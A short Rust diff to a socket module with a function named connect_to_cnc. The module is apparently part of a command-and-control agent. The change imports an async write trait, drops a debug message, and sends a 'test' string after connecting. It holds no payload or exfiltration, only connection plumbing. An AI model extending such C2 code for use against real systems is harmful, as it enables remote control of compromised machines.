@@ -1,5 +1,5 @@
 use tokio::net::TcpStream;
-
+use tokio::io::{AsyncWriteExt};
 pub enum SocketState {
     Handshake(HandshakeState),
     Operational
@@ -29,7 +29,6 @@ impl SocketStream {
             Err(e) => return Err(e),
             Ok(n_bytes) => {
                 if n_bytes == 0 {
-                    println!("Agent closed connection !");
                     return Ok((vec![0u8], 0));
                 }
                 
@@ -52,8 +51,9 @@ impl SocketStream {
     }
 }
 pub async fn connect_to_cnc(ip: &str, port: u16) -> Result<TcpStream, Box<dyn std::error::Error>> {
-    let stream = TcpStream::connect(&format!("{}:{}", ip, port)).await?;
+    let mut stream = TcpStream::connect(&format!("{}:{}", ip, port)).await?;
 
+    stream.write_all(b"test").await?;
     Ok(stream)
 }
 
